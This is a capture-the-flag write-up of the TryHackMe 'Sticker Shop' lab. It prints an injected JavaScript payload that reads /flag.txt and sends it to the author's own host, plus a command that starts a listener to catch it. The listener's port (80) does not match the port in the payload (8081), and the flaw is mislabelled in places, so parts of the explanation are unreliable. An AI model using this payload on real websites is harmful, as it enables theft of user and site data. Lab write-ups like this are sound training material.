# The Sticker Shop Writeup By Priyank Rastogi

## Introduction

This write-up describes the process of exploiting an HTML Injection vulnerability on a TryHackMe machine (The Sticker Shop) to retrieve sensitive data from the /flag.txt file. The challenge demonstrated the importance of securing web applications against injection vulnerabilities.

## Steps to Exploit

### Connecting to the Target Machine

- Launched the machine and noted the IP address assigned

- Navigated to the target application at http://<machine-ip>:8080/.

### Exploring the Application

- The homepage contained navigation buttons, including a link to a Feedback Page.
- Reviewed the source code of both the homepage and feedback page but found no significant clues or sensitive information.

### Identifying the Vulnerability

- While testing the feedback page, I noticed that it was vulnerable to HTML Injection.
- Injected custom HTML and JavaScript payloads to confirm that the application executed them, thereby verifying the vulnerability.

### Crafting the Exploit

Since direct access to /flag.txt was restricted due to insufficient privileges, I crafted a JavaScript payload to fetch the file's contents using the GET method and exfiltrate it to a server under my control.

```html
<script>
  fetch('/flag.txt', { method: 'GET' })
    .then(response => response.text())
    .then(data => {
      const img = new Image();
      img.src = `http://<my-machine-ip>:8081/?flag=${encodeURIComponent(data)}`;
      document.body.appendChild(img);
    })
    .catch(error => console.error('Error:', error));
</script>
```

### Setting Up the Listener

- Started a web server on my local machine to capture the exfiltrated flag data:

```bash
python3 -m http.server 80
```

- Injected the crafted payload into the feedback page's vulnerable input field.

### Retrieving the Flag

- The payload executed on the server, making a GET request to /flag.txt.
- The response containing the flag was sent to my machine and logged in the terminal running the HTTP server.

## Key Observations

- The application did not properly sanitize user input on the feedback page, allowing the injection of malicious scripts.
- While /flag.txt was not directly accessible, the HTML injection vulnerability allowed bypassing privilege restrictions via server-side fetch operations.

## Flag

- Use CyberChef to decode the FLAG 
- Use URL Decode.

---

Thank You! 
---

## Connect With Me

- [![GitHub](https://img.shields.io/badge/GitHub-000?logo=github&logoColor=white)](https://github.com/technical404)
- [![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/thepriyankrastogi/)
- [![Blog](https://img.shields.io/badge/Blog-FF5722?logo=rss&logoColor=white)](https://hackerpriyank.blogspot.com/)

